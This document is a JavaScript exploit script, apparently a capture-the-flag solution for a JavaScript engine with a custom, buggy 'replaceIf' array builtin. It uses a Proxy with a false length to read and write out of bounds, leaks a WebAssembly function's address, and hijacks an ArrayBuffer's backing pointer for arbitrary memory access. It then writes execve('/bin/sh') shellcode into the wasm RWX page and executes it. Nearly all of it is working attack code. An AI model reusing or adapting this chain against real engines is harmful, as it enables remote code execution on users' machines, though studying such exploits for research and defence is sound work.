function dp(x){}//{%DebugPrint(x);}
const buf8 = new ArrayBuffer(8);
const f64 = new Float64Array(buf8);
const u32 = new Uint32Array(buf8);
function d2u(val)
{ //double ==> Uint64
	f64[0] = val;
	let tmp = Array.from(u32);
	return tmp[1] * 0x100000000 + tmp[0];
}
function u2d(val)
{ //Uint64 ==> double
	let tmp = [];
	tmp[0] = parseInt(val % 0x100000000);
	tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
	u32.set(tmp);
	return f64[0];
}
const hex = (x) => ("0x" + x.toString(16));
function getWMain()
{
	const wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
	const wasmModule = new WebAssembly.Module(wasmCode);
	const wasmInstance = new WebAssembly.Instance(wasmModule, {});
	return wasmInstance.exports.main;
}
const wmain = getWMain();
const handler1 = {
	get: function(target, prop, receiver)
	{
		if (prop === 'length') {
			return 0x1000;
		} else {
			return target[prop];
		}
	}
};
// handler for Proxy used to trigger OOB

const arrs = [];
const abs = [];
var a = [1.1];
// the array used for OOB accessing
dp(a);

for (var i = 0; i < 0x10; i++)
{
	abs.push(new ArrayBuffer(0x100+i));
	// size can be used to identify the index
	arrs.push({a:0xdead, b:0xbeef, d:wmain})
}
// allocate ArrayBuffer and Objects just after [1.1]
var p = new Proxy(a, handler1);
// Proxy used to trigger OOB

function oobRead(idx)
{
	var ret;
	Array.prototype.replaceIf.call(p, idx,
		function(element){ret=element;return false;}, 1);
	// the element passed into callback function
	// will be an OOB read
	return ret;
}

var objIdx;
for (let i = 0; i < 0x1000; i++)
{
	if (d2u(oobRead(i)) === 0xdead00000000 &&
		d2u(oobRead(i+1)) === 0xbeef00000000)
	{
		objIdx = i;
		break;
	}
}
// search the first object
// in order to leak wmain object address
print(objIdx);
var wmainAddr = d2u(oobRead(objIdx + 2));
// leak the wmain address
print(hex(wmainAddr));
dp(wmain);
dp(abs[0]);

var heapAddr, absIdx, heapIdx;
for (let i = 0; i < 0x1000; i++)
{
	const size = d2u(oobRead(i+2));
	if (d2u(oobRead(i)) === d2u(oobRead(i+1)) &&
		size % 0x100000000 === 0 &&
		size / 0x100000000 < 0x110 && size / 0x100000000 >= 0x100)
	{
		heapAddr = d2u(oobRead(i+3));
		absIdx = size / 0x100000000 - 0x100;
		heapIdx = i + 3;
		break;
	}
}
// find the ArrayBuffer according to its signature
// heapAddr is the original heap address
// absIdx is the index of ArrayBuffer object found in abs array
// heapIdx is the index of backingOffset in array for OOB
print(absIdx)
print(hex(heapAddr))

function oobWrite(idx, val)
{
	Array.prototype.replaceIf.call(p, idx, ()=>true, u2d(val));
	// let callback return true,
	// so `val` will be written to float64 array
}

const dataView = new DataView(abs[absIdx]);

function memRead(addr)
{
	oobWrite(heapIdx, addr);
	// write backingOffset the given address
	return d2u(dataView.getFloat64(0, true));
	// read a float64 from that address
}

function getRwxAddr(addrWmain)
{
	// const sharedInfoAddr = memRead(addrWmain + 0x18) - 0x1;
	// const wasmExportedFuncDataAddr = memRead(sharedInfoAddr + 0x8) - 0x1;
	// const wasmInstanceAddr = memRead(wasmExportedFuncDataAddr + 0x10) - 0x1;
	// return memRead(wasmInstanceAddr + 0x88) - 1;
	//return memRead(addrWmain + 0x30) - 0x1;
	return memRead(addrWmain - 0xf0);
	// after some investigation,
	// it seems addrWmain-0xf0 always stores the rwx page
	// which will be executed when the wasm function is called
}
const rwxPageAddr = getRwxAddr(wmainAddr - 1);
print(hex(rwxPageAddr))

oobWrite(heapIdx, rwxPageAddr);
// write the backingOffset to rwx page
var shellcode = [
    0x99583b6a, 0x2fbb4852,
    0x6e69622f, 0x5368732f,
    0x57525f54, 0x050f5e54
];
for (var i = 0; i < shellcode.length; i++)
{
	dataView.setUint32(i * 4, shellcode[i], true);
}
// write the shellcode

wmain()
// execute the shellcode
